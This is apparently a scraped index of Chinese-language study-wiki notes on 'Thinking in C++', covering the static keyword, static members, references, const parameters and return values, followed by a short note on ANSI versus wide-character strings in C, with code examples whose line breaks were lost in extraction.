析构函数具体调用时机多数情况下main()函数结尾是通过调用exit()来结束程序，在exit()被调用时析构被调用。如果用C标准库的abort()函数来退出程序，静态对象的析构函数不会被调用。可以用标准C库函数atexit()来指定当前程序跳出main()（或调用exit()）时应执行的操作。这样，在跳出main()或调用exit()之前按，用atexit()注册的函数可以在所有对象的析构函数之前被调用。 12345678910111213141516171819202122232425262728293031323334//: C10:StaticDestructors.cpp// Static object destructors#include &lt;fstream&gt;using namespace std;ofstream out(&quot;statdest.out&quot;); // Trace fileclass Obj &#123; char c; // Identifierpublic: Obj(char cc) : c(cc) &#123; out &lt;&lt; &quot;Obj::Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125; ~Obj() &#123; out &lt;&lt; &quot;Obj::~Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125;&#125;;Obj a(&#x27;a&#x27;); // Global (static storage)// Constructor &amp; destructor always calledvoid f() &#123; static Obj b(&#x27;b&#x27;);&#125;void g() &#123; static Obj c(&#x27;c&#x27;);&#125;int main() &#123; out &lt;&lt; &quot;inside main()&quot; &lt;&lt; endl; f(); // Calls static constructor for b // g() not called out &lt;&lt; &quot;leaving main()&quot; &lt;&lt; endl;&#125; ///:~ 123456Obj::Obj() for ainside main()Obj::Obj() for bleaving main()Obj::~Obj() for bObj::~Obj() for a The constructor for a is called before main( ) is entered, and the constructor for b is called only because f( ) is called. When main( ) exits, the destructors for the objects that have been constructed are called in reverse order of their construction. This means that if g( ) is called, the order in which the destructors for b and c are called depends on whether f( ) or g( ) is called first. Static initialization dependency 有多个文件都有作用域为多个translation units的静态对象，这些静态对象之间互有依赖，如 一个文件12extern int y;int x = y + 1; 另一个文件12extern int x;int y = x + 1; 谁先初始化谁后初始化的顺序是不确定的 解决办法： 不使用，避免静态对象之间初始化的依赖 将所有有依赖的这些静态对象放到同一个文件中，文件中的顺序就是初始化的顺序 两种办法 10: Name ControlWhat to do标题 Static members in C++ 有时我们需要一个在所有类的对象都共享的变量，在C中可以用全局变量实现，但全局变量没有隐藏在类的内部。如果既能让所有类的对象都共享，并且能放在类里，那就再理想不过了。static数据成员就是这个问题的解决方法。 Static members 在C中，static意味着Hidden和Persistent。members本身在类中，由access rules(访问控制符，public，protected，private）来做Hidden的事，所以static用来实现Hidden的任务结束了（像先前在C那样，将name修改为本文件可见）。加上static后表示这个成员是全局的，起Persistent的作用，表示这么一个东西，它不会随着对象的不同而不同，它是对象instances之间共享的东西。所以说static成员变量是class-wide（类级别）上的东西。 static member也是类的成员，类外对静态成员变量的访问需要遵守access rules(访问控制符，public，protected，private） 静态成员变量存储在全局区，且必须在一个地方定义（definition） 类中的是declaration，declaration并没分空间。必须有一个地方写上definition，编译器才会给静态成员变量分空间。通常是.h放类的declaration，在.cpp中写definition .h12345678class A&#123;private: static int i;public: //...&#125;; 正确的写法.cpp12// definitionint A::i; // ok,编译器会默认初始化为0.cpp12// definitionint A::i = 20; // ok,编译器会初始化为20错误的写法从设计上来讲，static限制A::i只在当前文件可见，但A::i已经在类A中是private，private是说只有类才能访问，这会冲突。所以definition这里前面不用再加上static.cpp12// definitionstatic int A::i; //error 静态成员变量是所有对象instances共享的，是属于整个类的一部分，所以： 不能在构造函数初始化列表中进行初始化，因为静态成员变量与是否有对象实例无关。初始化列表只能对非静态成员变量进行初始化 可以在构造函数的函数体中进行赋值，因为静态成员变量也是类的成员，类中的函数可以访问到。对象也可以通过this指针访问到 两种访问方式 123456789101112131415class A&#123;public: //public，所以main中可以直接访问到i static int i; //如果private的，main中的两行也访问不到&#125;;int A::i = 10;int main()&#123; A a; int r1 = A::i; //方式一：类名::静态数据成员 int r2 = a.i; //方式二：类对象名 静态数据成员&#125; Static member function static member function也是类的成员，类外对静态成员变量的访问需要遵守access rules(访问控制符，public，protected，private） 出现在类外的函数定义（definition）不用再写关键字static 静态成员函数只能访问静态成员变量和其他静态成员函数 因为，静态成员函数与是否有对象实例无关，那也就没有this指针(this指针指向当前调用成员函数的对象)，没有this指针，也就访问不到非静态成员，也不能调用非静态的成员函数 1234567891011121314151617181920212223242526272829303132333435363738//: C10:StaticMemberFunctions.cppclass X &#123;private: int i; static int j;public: X(int ii = 0) : i(ii) &#123; // Non-static member function can access static member function or data: j = i; &#125; int val() const &#123; return i; &#125; static int incr() &#123; //! i++; // Error: static member functioncannot access non-static member data return ++j; &#125; static int f() &#123; //! val(); // Error: static member function cannot access non-static member function return incr(); // OK -- calls static &#125;&#125;;int X::j = 0;int main() &#123; X x; X* xp = &amp;x; x.f(); xp-&gt;f(); X::f(); // Only works with static members&#125; ///:~ 调用静态成员函数的两种方式 1234567891011121314151617//: C10:SimpleStaticMemberFunction.cpp class X &#123;public: static void f()&#123;&#125;;&#125;;int main() &#123; //方式一 X::f(); //方式二 X x; x.f();&#125; However, it’s more typical to call a static member function by itself, without any specific object, using the scope-resolution operator 静态成员函数提供了一种方法：在一个类没有创建任何对象之前来调用类中的函数；有这么一个东西，与是否存在类的对象无关的 静态成员变量同理：在一个类没有创建任何对象示例之前，就能让其他人来访问类中的数据 总结 小结 Uses of \"static\" in C++ Static free functions Internal Linkage (deprecated) Static global variables Internal Linkage (deprecated) Static local variables Persistent storage Static member variables Shared by all instances Static member function Shared by all instances, can only access static member variables Static free functions：指的是在类外定义的、具有静态链接（internal linkage）的函数。这意味着这些函数仅在定义它们的翻译单元（通常是一个.cpp文件）内部可见，而不能被其他翻译单元看到或链接。这样可以避免与其他翻译单元中具有相同名称的函数发生命名冲突。 Static global variables：指的是在所有函数外面定义的、具有静态链接的全局变量。这种变量也只在定义它的翻译单元内部可见，从而避免了在不同的翻译单元之间共享。 废弃（deprecated） 自C++11开始，匿名命名空间（anonymous namespaces）被推荐用于替代静态全局变量和静态自由函数，因为它提供了更好的封装和防止命名冲突的手段。 分析方法 从存储类型和可见性两方面进行分析。然后，注意静态成员变量和静态成员函数的一些特点。比如静态成员变量注意要有definition，静态成员函数只能访问静态成员变量和调用静态成员函数等。"},{"title":"static（废弃草稿）","path":"/wiki/Thinking_in_C++/static（废弃草稿）.html","content":"In both C and C++ the keyword static has two basic meanings, which unfortunately often step on each other’s toes: Static storage Allocated once at a fixed address; that is, the object is created in a special static data area rather than on the stack each time a function is called. Visibility of a name Local to a particular translation unit (and local to a class scope in C++). Here, static controls the visibility of a name, so that name cannot be seen outside the translation unit or class. internal linkage:This also describes the concept of linkage, which determines what names the linker will see. 持久存储 static 局部变量存放在静态数据区（static data area）而不在函数调用时的堆中中分配。其实，static 局部变量就是全局变量。 访问性的限制 如果一个全局变量/函数是static的，表明这个全局变量/函数只在这个.c/.cpp文件中有效，其他文件不能访问到这个全局变量/函数。 概念补充 存储类型：变量存放在哪，全局区，堆栈，堆等。 变量的生命周期：变量所在的内存从分配到释放的这段时间。 变量的作用域：变量在源码中可以被访问到的范围。 类别 含义 例子 进程作用域 在整个进程中都被能访问到。 全局变量 文件作用域 在当前源码文件内可以访问到 静态变量 函数作用域 在函数内可以访问到 局部变量 块作用域 只能在定义变量的&quot;{}&quot;块内访问 作用域会影响这个名字在link时能不能被其他translation unit访问到。全局变量默认是external linkage，所有translation units都能访问到。 Controlling linkage Ordinarily, any name at file scope (that is, not nested inside a class or function) is visible throughout all translation units in a program. This is often called external linkage because at link time the name is visible to the linker everywhere, external to that translation unit. Global variables and ordinary functions have external linkage. 如果在object或function前加了static，就表明这个object或function的名字只在当前的translation unit有效，这个name是internal linkage，其他translation unit无法看见也无法访问到。 static elements in C/C++ static variables inside functions 存储是全局的，Value is remembered for entire program 作用域：函数作用域，仅在函数内可以访问到 生命周期： 函数首次被调用时，静态成员被初始化，初始化只会发生一次 程序结束时销毁 Example: num_calls将在每次函数执行时候++ 123456void f()&#123; static int num_calls = 0; //... num_calls++;&#125; // 全局变量，但只能在函数里访问 static class objects inside functions 存储是全局的，Value is remembered for entire program 作用域：函数作用域，仅在函数内可以访问到 生命周期： 函数首次被调用时，对象通过构造函数被初始化，初始化只会发生一次 程序结束时销毁，会调用析构函数 本地变量是一个自定义的类12345678910111213class X&#123;public: X(int, int); ~X(); //...&#125;;void f()&#123; static X my_X(10, 20); //...&#125; Construction occurs when definition is encountered Constructor called at-most once 构造只发生一次，在函数第一次被调用时发生 The constructor arguments must be satisfied Destruction takes place on exit from program 析构在程序结束时发生 Compiler assures LIFO order of destructors 所有被创建的对象的析构函数按创建时相反的顺序被调用 析构函数在exit()被调用时才被调用Destructors for static objects (that is, all objects with static storage, not just local static objects as in the example above) are called when main( ) exits or when the Standard C library function exit( ) is explicitly called. In most implementations, main( ) just calls exit( ) when it terminates. This means that it can be dangerous to call exit( ) inside a destructor because you can end up with infinite recursion. Static object destructors are not called if you exit the program using the Standard C library function abort( ).You can specify actions to take place when leaving main( ) (or calling exit( )) by using the Standard C library function atexit( ). In this case, the functions registered by atexit( ) may be called before the destructors for any objects constructed before leaving main( ) (or calling exit( )). 12345678910111213141516171819202122232425262728293031323334//: C10:StaticDestructors.cpp// Static object destructors#include &lt;fstream&gt;using namespace std;ofstream out(&quot;statdest.out&quot;); // Trace fileclass Obj &#123; char c; // Identifierpublic: Obj(char cc) : c(cc) &#123; out &lt;&lt; &quot;Obj::Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125; ~Obj() &#123; out &lt;&lt; &quot;Obj::~Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125;&#125;;Obj a(&#x27;a&#x27;); // Global (static storage)// Constructor &amp; destructor always calledvoid f() &#123; static Obj b(&#x27;b&#x27;);&#125;void g() &#123; static Obj c(&#x27;c&#x27;);&#125;int main() &#123; out &lt;&lt; &quot;inside main()&quot; &lt;&lt; endl; f(); // Calls static constructor for b // g() not called out &lt;&lt; &quot;leaving main()&quot; &lt;&lt; endl;&#125; ///:~ 运行输出123456Obj::Obj() for ainside main()Obj::Obj() for bleaving main()Obj::~Obj() for bObj::~Obj() for a The constructor for a is called before main( ) is entered, and the constructor for b is called only because f( ) is called. When main( ) exits, the destructors for the objects that have been constructed are called in reverse order of their construction. This means that if g( ) is called, the order in which the destructors for b and c are called depends on whether f( ) or g( ) is called first. Confusion 正因为static关键字可以表示两种含义（存储类型和可见性），所以有时会造成理解上的困扰，现在我们展示下how the two meanings of static can cross over each other. 对于全局变量，static改变的是可见性 All global objects implicitly have static storage class 1int a = 0; 存储类型：变量a将存放在static data area，变量a的初始化在进入main()前完成 可见性：变量a在all translation units都是可见的（visibility） 仅从visibility上对比，extren表示这个名字对所有translation units都可见，是static的opposite（visible only in this translation unit） 所以上面definition的等价写法如下： 1extern int a = 0; 但如果是 1static int a = 0; 存储类型：static在这里不会修改到变量a的存储类型（还是放在static data area） 可见性：修改的是可见性，表明a这个名字只在当前文件可见 对于局部变量，static改变的是存储类型 存储类型：变为持久存储，放在static data area 可见性：不会改变。这时加上extern是没意义的 这时加上extern是表明这个变量的the storage exists elsewhere 12345678910111213//: C10:LocalExtern.cpp//&#123;L&#125; LocalExtern2#include &lt;iostream&gt;int main()&#123; extern int i; std::cout &lt;&lt; i;&#125; ///:~//: C10:LocalExtern2.cpp &#123;O&#125;int i = 5;///:~ 对于函数名（非成员函数），static改变的是可见性 对于非成员函数，static和extern只会改变可见性，函数地址都是全局的 12345// external linkagevoid f();// 等价写法extern void f(); 加static就表明函数f()只在当前文件可见，有时称作文件静态（file static） 1static void f(); Example g_global： File1中的g_global是个全局变量，对所有translation units可见，所以在File12中可以用extern int g_global来表明g_global定义在别处，然后就可以使用g_global1了。 s_local： static，只对当前文件可见。即使File2中用extern int s_local表明s_local定义在别处，编译能过，但link时过不去（File1说s_local只给自己这个文件用） hidden： static，函数名只对当前文件可见，File2不可见，不可使用 思考 换个角度其实可以理解，加上static后，无法同时将两个含义都修改，加上static后变的只有一个含义。比如 全局变量，本身就是全局存储，加了static还是全局存储，所以加static就是限制可见性 局部变量，本身可见性是在块作用域，加了static可见性还是在块作用域里，所以加static就是修改为持久存储 函数（非成员），函数地址本身就是全局地址，加了static还是全局，所以加static就是限制可见性 当然，忘了的话，从存储类型和可见性进行分析即可，不用想是这个没变，所以另外一个变了。 Static initialization dependency 有多个文件都有作用域为多个translation units的静态对象，这些静态对象之间互有依赖，如 一个文件12extern int y;int x = y + 1; 另一个文件12extern int x;int y = x + 1; 谁先初始化谁后初始化的顺序是不确定的 解决办法： 不使用，避免静态对象之间初始化的依赖 将所有有依赖的这些静态对象放到同一个文件中，文件中的顺序就是初始化的顺序 两种办法 10: Name ControlWhat to do标题 Static members in C++ 从设计层面上来看： 在C中，static意味着Hidden和Persistent，而在C++ 中多了对象的概念，我们来看下Hidden和Persistent的概念在C++中是如何延续的： Hidden，实现数据隐藏 在C中，我们通过static来修改一个变量/函数的可见性，达到Hidden的目的。但在C++中，我们有access rules(访问控制符，public，protected，private）来做Hidden的事。于是，对一个static的成员变量来说，static用来实现Hidden的任务结束了。 Persistent，持久 同一个函数多次调用却仍存在的东西，persistent。C语言中有两种东西是persistent的，全局变量和malloc的东西（malloc的在整个程序的运行周期都存在） 在C++，对象instances之间共享的东西，不随着对象的不同而不同。所以说static成员变量是class-wide（类级别）上的东西。 有时我们需要一个在所有类中都共享的变量，在C中可以用全局变量实现，但全局变量没有隐藏在类的内部。如果既能让所有类的对象都共享，并且能放在类里，那就再理想不过了。static数据成员就是这个问题的解决方法。 Static members static member也是类的成员，类外对静态成员变量的访问需要遵守access rules(访问控制符，public，protected，private） 静态成员变量存储在全局区，且必须在一个地方定义（definition） 类中的是declaration，declaration并没分空间。必须有一个地方写上definition，编译器才会给静态成员变量分空间。通常是.h放类的declaration，在.cpp中写definition .h12345678class A&#123;private: static int i;public: //...&#125;; 正确的写法.cpp12// definitionint A::i; // ok,编译器会默认初始化为0.cpp12// definitionint A::i = 20; // ok,编译器会初始化为20错误的写法从设计上来讲，static限制A::i只在当前文件可见，但A::i已经在类A中是private，private是说只有类才能访问，这会冲突。所以definition这里前面不用再加上static.cpp12// definitionstatic int A::i; //error 静态成员变量是所有对象instances共享的，是属于整个类的一部分，所以： 不能在构造函数初始化列表中进行初始化，因为静态成员变量与是否有对象实例无关。初始化列表只能对非静态成员变量进行初始化 可以在构造函数的函数体中进行赋值，因为静态成员变量也是类的成员，类中的函数可以访问到。对象也可以通过this指针访问到 两种访问方式 123456789101112131415class A&#123;public: //public，所以main中可以直接访问到i static int i; //如果private的，main中的两行也访问不到&#125;;int A::i = 10;int main()&#123; A a; int r1 = A::i; //方式一：类名::静态数据成员 int r2 = a.i; //方式二：类对象名 静态数据成员&#125; Static member function static member function也是类的成员，类外对静态成员变量的访问需要遵守access rules(访问控制符，public，protected，private） 出现在类外的函数定义（definition）不用再写关键字static 静态成员函数只能访问静态成员变量和其他静态成员函数 因为，静态成员函数与是否有对象实例无关，那也就没有this指针(this指针指向当前调用成员函数的对象)，没有this指针，也就访问不到非静态成员，也不能调用非静态的成员函数 1234567891011121314151617181920212223242526272829303132333435363738//: C10:StaticMemberFunctions.cppclass X &#123;private: int i; static int j;public: X(int ii = 0) : i(ii) &#123; // Non-static member function can access static member function or data: j = i; &#125; int val() const &#123; return i; &#125; static int incr() &#123; //! i++; // Error: static member functioncannot access non-static member data return ++j; &#125; static int f() &#123; //! val(); // Error: static member function cannot access non-static member function return incr(); // OK -- calls static &#125;&#125;;int X::j = 0;int main() &#123; X x; X* xp = &amp;x; x.f(); xp-&gt;f(); X::f(); // Only works with static members&#125; ///:~ 调用静态成员函数的两种方式 1234567891011121314151617//: C10:SimpleStaticMemberFunction.cpp class X &#123;public: static void f()&#123;&#125;;&#125;;int main() &#123; //方式一 X::f(); //方式二 X x; x.f();&#125; However, it’s more typical to call a static member function by itself, without any specific object, using the scope-resolution operator 静态成员函数提供了一种方法：在一个类没有创建任何对象之前来调用类中的函数；有这么一个东西，与是否存在类的对象无关的 静态成员变量同理：在一个类没有创建任何对象示例之前，就能让其他人来访问类中的数据 总结 小结 Uses of \"static\" in C++ Static free functions Internal Linkage (deprecated) Static global variables Internal Linkage (deprecated) Static local variables Persistent storage Static member variables Shared by all instances Static member function Shared by all instances, can only access static member variables Static free functions：指的是在类外定义的、具有静态链接（internal linkage）的函数。这意味着这些函数仅在定义它们的翻译单元（通常是一个.cpp文件）内部可见，而不能被其他翻译单元看到或链接。这样可以避免与其他翻译单元中具有相同名称的函数发生命名冲突。 Static global variables：指的是在所有函数外面定义的、具有静态链接的全局变量。这种变量也只在定义它的翻译单元内部可见，从而避免了在不同的翻译单元之间共享。 废弃（deprecated） 自C++11开始，匿名命名空间（anonymous namespaces）被推荐用于替代静态全局变量和静态自由函数，因为它提供了更好的封装和防止命名冲突的手段。 分析方法 从存储类型和可见性两方面进行分析。然后，注意静态成员变量和静态成员函数的一些特点。比如静态成员变量注意要有definition，静态成员函数只能访问静态成员变量和调用静态成员函数等。 全局变量（基本类型，不含对象） 非static static 存储位置 全局数据区 全局数据区 生命周期 程序启动时初始化程序结束时销毁 程序启动时初始化程序结束时销毁 可见性 所有文件 当前文件 static 变量初始化： 如果没有显式初始化，基本类型会自动初始化为零 非static，基本类型： 存储位置和生命周期：全局数据区；程序启动时在启动函数中初始化（main函数前），程序结束时销毁 可见性：所有文件 static，基本类型： 存储位置和生命周期：全局数据区；程序启动时在启动函数中初始化（main函数前），程序结束时销毁 可见性：当前文件 如果没有显式初始化，基本类型会自动初始化为零 局部变量（在函数中的变量） 非static static 存储位置 栈 全局数据区 生命周期 函数调用时初始化函数结束时释放 程序启动时初始化程序结束时销毁 可见性 函数内部，块作用域（左右花括号&#123;&#125;） 函数内部，块作用域（左右花括号&#123;&#125;） 非static，基本类型和对象： 存储位置和生命周期：堆栈；函数调用时在相应栈帧中初始化，函数调用结束时释放 可见性：当前作用域（函数左右花括号&#123;&#125;里），其他函数无法访问该变量。 对象：需要遵守access rules static，基本类型和对象： 存储位置和生命周期：全局数据区，函数第一次调用时初始化，程序结束时销毁 可见性：还是当前作用域（函数左右花括号&#123;&#125;里），其他函数无法访问该变量 对象：需要遵守access rules 函数 非static static 存储位置 函数地址在全局数据区 函数地址在全局数据区 可见性 所有文件 当前文件 非static： 存储位置：全局数据区，函数地址本身是全局的 可见性：所有文件；或被限制在namaspace中 static： 存储位置：全局数据区，函数地址本身是全局的 可见性：当前文件 类 成员变量 非static static 存储位置 看是局部对象还是全局对象 全局数据区 生命周期 看是局部对象还是全局对象 程序启动时初始化程序结束时销毁 可见性 受public、protected、private限制 被该类所有对象共有，受public、protected、private限制 非static： 存储位置，看对象在哪里实例化 局部变量 全局变量 可见性：受public、protected、private限制 static： 存储位置和生命周期：全局数据区；程序启动时在启动函数中初始化（main函数前），程序结束时销毁 可见性：被该类所有对象共有，受public、protected、private限制 特性： 被所有对象所共有 类中的是declaration，必须要有definition。definition不用在写static 也是类的成员，所以对象可以通过this指针访问到；成员函数（包括静态和非静态）也可以访问到 访问方式可以是类::静态成员变量或对象.静态成员变量 成员函数 非static static 存储位置 函数地址在全局数据区 函数地址在全局数据区 可见性 受public、protected、private限制 被该类所有对象共有，受public、protected、private限制 非static： 存储位置：全局数据区，函数地址本身是全局的，不占用类和对象的空间大小 可见性：受public、protected、private限制 static： 存储位置和生命周期：全局数据区，函数地址本身是全局的，不占用类和对象的空间大小 可见性：被该类所有对象共有，受public、protected、private限制 特性： 只能访问静态成员变量和调用静态成员函数（因为与对象实例无关，没有this指针） 被所有对象所共有 调用方式可以是类::静态成员函数(参数列表)或对象.静态成员函数(参数列表)"},{"title":"引用I-基础概念","path":"/wiki/Thinking_in_C++/引用I-基础概念.html","content":"A reference is like a constant pointer that is automatically dereferenced by the compiler, so it has the effect of being an alias to an object. Declaring references Initialization establishes a binding 本地或全局变量 1type &amp;refname =name; 12int x = 3;int&amp; y = x; A reference must be initialized when it is created. 参数列表或成员变量 1type &amp;refname 12void f(int &amp;x);f(y); 在函数被调用或构造函数执行时初始化 Rules of references 绑定后不能在改变，不能再指向别人 Assignment changes the object referred-to，改变引用的值就是改变它指向的那个变量的值 12int&amp; y = x;y = 12; // Changes value of x 引用绑定的目标必须有位置，不能是一个临时的结果 12void func(int &amp;);func(i * 3); // Warning or error! References in functions You can think of a reference as nothing more than a syntax convenience, if you want. 1234567891011121314151617181920212223242526//: C11:Reference.cpp// Simple C++ referencesint* f(int* x) &#123; (*x)++; return x; // Safe, x is outside this scope&#125;int&amp; g(int&amp; x) &#123; x++; // Same effect as in f() return x; // Safe, outside this scope&#125;int&amp; h() &#123; int q;//! return q; // Error static int x; return x; // Safe, x lives outside this scope&#125;int main() &#123; int a = 0; f(&amp;a); // Ugly (but explicit) g(a); // Clean (but hidden) h()=16;//返回的是reference，可以做左值 &#125; ///:~ 使用引用，会更清晰，但g(a)的形式看不出是by-value还是by-references，表明上看是传一个变量名a，但实际上函数内部可能会修改到传的这个变量a值 上面h()做左值的问题左值是可以被赋值的值。与之相对的是右值（R-value），通常指那些不能被赋值的临时值或字面值1234567891011121314151617181920212223#include &lt;stdio.h&gt;int x = 0;int&amp; h() // 返回了一个引用类型，可以做左值&#123; return x;&#125;int* g() // 返回类型是一个指针类型，返回了&amp;x，x的地址，对它解引用后可做左值&#123; return &amp;x;&#125;int main()&#123; h() = 2; // 返回的引用没有名字，匿名了，h()在这里表示是x的别名，这一行实际上就是 x = 2 printf(&quot;%d &quot;, x); *g() = 4; // 实际上就是 *(&amp;x)，即x = 4 printf(&quot;%d &quot;, x); return 0;&#125;运行输出1224int&amp; h()：这个函数返回一个对整数 x 的引用。由于返回的是引用，所以在 main 函数中 h() 可以被当作 x 来使用，它是 x 的一个别名。因此 h() = 2; 等同于 x = 2;。int* g()：这个函数返回一个指向整数 x 的指针。当在 main 函数中使用 *g() 时，你实际上是在解引用返回的指针，也就是获取指针所指向的值，即 x。所以 *g() = 4; 相当于 *(&amp;x) = 4;，进一步就是 x = 4;。对于h()，如果不想被做左值，加上const，表示返回的是常量引用（指向的是常量），你不能通过这个引用来修改这个引用指向的值；g()指针，同理123456789const int&amp; h() // 返回的是一个常量引用（指向的是常量），你不能用这个引用来修改它指向的值&#123; return x;&#125;const int* g() // 返回一个指向常量的指针，你不能解引用后来修改它指向的值&#123; return &amp;x;&#125; Pointers vs. References References Pointers can’t be null can be set to null are dependent on an existing variable,they are an alias别名 for an variable pointer is independent of existing objects can’t change to a new “address” location can change to point to a different address Restrictions No references to references No pointers to references 12int&amp; *p; // illegal //指向int&amp;的指针 所以也没有arrays of references Reference to pointer is ok 12void f(int*&amp; p); // p是引用，是int指针类型p的别名 // 因为指针变量p有位置，所以引用可以是它的别名 以上两点是因为引用在反汇编中看是没有位置的，找不到在哪里来表示了这个引用，正如开头所说，引用是编译器智能维护的一个const pointer Understanding of references 表面上看，是给变量起别名，对别名的操作就是对它指向的那个object的操作 实际上，引用是通过constant pointer实现的，由编译器维护 Why Reference 安全 弱化版的指针，不能做运算，不能取值，不能指向别的地方。 语义清晰 让代码少了很多*号"},{"title":"引用II","path":"/wiki/Thinking_in_C++/引用II.html","content":"References as class members Declared without initial value 声明这个&amp;时没法给初始值，因为不清楚将来X的对象实例化时这个引用要和谁捆在一起。 Must be initialized using constructor initializer list 如果放在{}里写那是assignment赋值了m_y=...; 12345678class X&#123;public: int &amp;m_y; X(int &amp;a);&#125;;X::X(int &amp;a) : m_y(a) &#123;&#125; Returning references Functions can return references But they better refer to non-local variables!不能返回函数里本地变量的值，函数调用完后你还留着那个垃圾值的地址干什么 123456789#include &lt;assert.h&gt;const int SIZE = 32;double myarray[SIZE];double&amp; subscript(const int i) //函数返回类型是返回double类型引用&#123; return myarray[i]; //返回的变量的lifetime需要比subscript函数长&#125; return那里返回的是一个直接的变量，没有*号，没有其他符号。因为return出去的这个变量将来会在调用这个函数的地方会和另一个引用结合在一起，如 1double &amp;f = subscript(2); //即 double&amp; f=myarray[2] Example 1234567891011main()&#123; for (int i = 0; i &lt; SIZE; i++) &#123; myarray[i] = i * 0.5; &#125; double value = subscript(12); //subscript返回了一个匿名的引用，然后把这个引用的值给了value变量 // 其实就是myarray[12]的值赋给了value subscript(3) = 34.5; // 做左值，其实就是myarray[3]=34.5&#125; const in Functions Arguments Pass by const value – don’t do it Passing by const reference 1Person(const string&amp; name, int weight); const qualifier protects from change，表示函数里don’t change the string object 对调用者的一种保证，表示函数内部不会修改调用者送进来的参数，由编译器检查 more efficient to pass by reference(address)than to pass by value 因为by-value方式传递有大量的堆栈赋值开销，而引用和指针只要传一个地址 Const reference parameters 如果你不想让参数被函数内部改变，就加上const 123456// y is a constant! Can&#x27;t be modified.void func(const int&amp; y, int&amp; z)&#123; z = z * 5; // ok y += 8; // error!&#125; Temporary values are const 函数参数是&amp;时，不能传一个临时结果进来 12void func(int &amp;);func(i * 3); // Generates warning or error ! 有很多种解释来解释为什么不行，其中一种是：当编译器编译上面代码时会产生一个const的临时变量接收i*3的结果，临时变量是const的，所以不能传给(int&amp;)，不能access it 123void func(int &amp;);const int tmp@ = i * 3;func(tmp@); // Problem -- binding const ref to non-const argument ! 给函数参数加上const，就没问题了，编译能过。 可以这样理解，i*3编译后临时结果的值交给了一个const的临时变量来存储，const 临时变量可以交给const int&amp; 123456789101112131415#include &lt;iostream&gt;using namespace std;void f(const int&amp; i) //表示函数里不会修改传进来的值&#123; cout &lt;&lt; i &lt;&lt; endl;&#125;int main()&#123; int i = 3; f(i * 3); return 0;&#125; const in Function returns return by const value for user defined types, it means “prevent use as an value” for built-in’s it means nothing 表明返回的东西不能被修改 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int x = 0;int&amp; h() // 返回了一个引用类型，可以被修改，可以做左值&#123; return x;&#125;const int&amp; g() // 返回的是一个常量引用返回的值不能再被修改&#123; return x;&#125;int main()&#123; h() = 2; // 返回的引用没有名字，匿名了，h()在这里表示是x的别名，这一行实际上就是 x = 2 printf(&quot;%d &quot;, x); //g() = 4; // error：表达式必须是可修改的左值 return 0;&#125; return by const pointer or reference depends on what you want your client to do with the return value 这里应该搬到const一章 视频中编译能过，俺用VC、g++过不了。报错：表达式必须是可修改的左值（估计编译器版本高了就编译不过） 视频中想表达的意思是：f()返出来的临时变量因为没加const，可以做左值，然后那个匿名对象.i被赋成了10。但是我们没有任何形式可以访问到这个对象。本来想着编译能过的话，加上析构函数，看汇编能找到的，但是编译不过那就算了 12345678910111213141516171819202122232425262728class A&#123;public: int i; A() : i(0) &#123;&#125;&#125;;A f()&#123; A a; return a;&#125;// f()没看懂参考g()就明白了// int g()// &#123;// int i=10;// return i;// &#125;int main()&#123; A a2; a2.i = 10; f().i = 10; return 0;&#125; 然后在书上看到这段代码，编译是通过的 123456789101112131415161718192021222324252627282930313233class X &#123; int i;public: X(int ii = 0); void modify();&#125;;X::X(int ii) &#123; i = ii; &#125;void X::modify() &#123; i++; &#125;X f5() &#123; return X();&#125;const X f6() &#123; return X();&#125;void f7(X&amp; x) &#123; // Pass by non-const reference x.modify();&#125;int main() &#123; f5() = X(1); // OK -- non-const return value f5().modify(); // OK//! f7(f5()); // Causes warning or error// Causes compile-time errors://! f7(f5());//! f6() = X(1);//! f6().modify();//! f7(f6());&#125; ///:~"},{"title":"拷贝构造I","path":"/wiki/Thinking_in_C++/拷贝构造I.html","content":"123 1卷链接：Thinking in C++, 2nd ed. Volume 1 摘抄： 11: References &amp; the Copy-Constructor A reference (&amp;) is like a constant pointer that is automatically dereferenced. References are like constant pointers that are automatically dereferenced by the compiler. When a reference is used as a function argument, any modification to the reference inside the function will cause changes to the argument outside the function. a reference has much cleaner syntax."},{"title":"C语言中的宽字符","path":"/wiki/Windows_API/C语言中的宽字符.html","content":"ANSI字符集与Unicode字符集 IDE编程环境的字符默认使用的是ANSI字符集（多字节字符集），英文字符占1个字节，中文汉字占两个字节，简体中文Windows下的ANSI编码通常是指GBK(代码页936)。 使用L则表示使用的是Unicode字符，Windows系统下的Unicode默认是UTF-16存储规则。 例 szStr使用的是ANSI字符集，字符’A’占1个字节，'中’占2个字节，结束符占1个字节，总长度4个字节。 swzStr使用的是Unicode(utf-16)，字符’A’占2个字节，'中’占2个字节，结束符占2个字节，总长度6个字节。 ANSI字符集：在C语言中，ANSI字符集通常是指按照当前系统的区域设置编码的多字节字符集。它通常用于表示ASCII字符以及扩展的、特定于语言或区域的字符 DBCS(双字节字符集)【准确说,应该是MBCS(Multi-Byte Chactacter System, 多字节字符系统)】，它由一个或两个字节表示一个字符，这说明DBCS并不一定是两个字节。对于英文字母，是向ASCII兼容的，依然由1个字节表示；而对于中文则用2个字节表示。英文和中文可以统一地处理，区分字符为中文的方法是看2个字节中的高字节的首位是否为1。GB2312，GBK到GB18030都属于DBCS Unicode字符集（宽字符集），ANSI字符集相对比Unicode存储耗费的字节数更少，于是又称为窄字符集 12345678910#include &lt;stdio.h&gt;int main()&#123; char szStr[] = &quot;A中&quot;; wchar_t swzStr[] = L&quot;A中&quot;; //wchar_t类型在stdio.h文件中 return 0;&#125; wchar_t swaStr的Momory窗口注释编译器仍以ASCII码为注释，所以是乱码。代码中程序员的意图是用Unicode来对字符&quot;A中&quot;进行编码存储（用了L） 函数变化 ASCII字符集和Unicode字符集在内存中的存储方式不一样，字符占的字节数变了，所以要用对应版本的字符串函数，否则会出错。窄字符要用窄字符的函数版本，宽字符要用宽字符的函数版本。 多字节字符 宽字符 char wchar_t printf wprintf 打印到控制台函数 strlen wcslen 获取长度 strcpy wcscpy 字符串复制 strcat wcscat 字符串拼接 strcmp wcscmp 字符串比较 strstr wcsstr 字符串查找 打印宽字符到控制台 1234567891011#include &lt;stdio.h&gt;#include &lt;locale.h&gt; //setlocaleint main()&#123; setlocale(LC_ALL, &quot;&quot;); wchar_t swzStr[] = L&quot;A中&quot;; // wchar_t类型在stdio.h文件中 wprintf(L&quot;%s &quot;, swzStr); return 0;&#125; 